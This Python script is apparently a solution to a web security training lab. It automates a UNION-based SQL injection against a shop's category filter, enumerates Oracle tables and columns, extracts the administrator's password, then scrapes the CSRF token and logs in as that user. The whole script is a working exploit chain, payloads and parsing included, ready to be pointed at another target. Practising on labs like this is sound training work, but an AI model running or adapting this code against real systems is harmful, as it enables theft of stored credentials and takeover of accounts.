import requests, urllib
from lxml import html

def encodeURI(s):
    return urllib.parse.quote(s)

session = requests.Session()

URL = "https://0a0b009d036a49d480690856005d009a.web-security-academy.net/"
PARAM = "filter?category="

# Extract db infomation

PAYLOAD_1 = "' UNION SELECT t.table_name, c.column_name FROM user_tables t INNER JOIN all_tab_columns c ON t.table_name = c.table_name -- -"

response = session.get(URL + PARAM + encodeURI(PAYLOAD_1)).text
parser = html.fromstring(response)
all_columns = parser.xpath("//td/text()")
all_tables = parser.xpath("//th/text()")

users_tb = [x for x in all_tables if 'USERS' in x][0]
username_tb = [x for x in all_columns if 'USERNAME' in x][0]
password_tb = [x for x in all_columns if 'PASSWORD' in x][0]

# Extract password

PAYLOAD_2 = f"' UNION SELECT {username_tb}, {password_tb} FROM {users_tb} -- -"
response = session.get(URL + PARAM + encodeURI(PAYLOAD_2)).text

parser = html.fromstring(response)

username = "administrator"
password = parser.xpath(f"//th[text()='{username}']/following-sibling::*/text()")[0]

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_3 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_3)
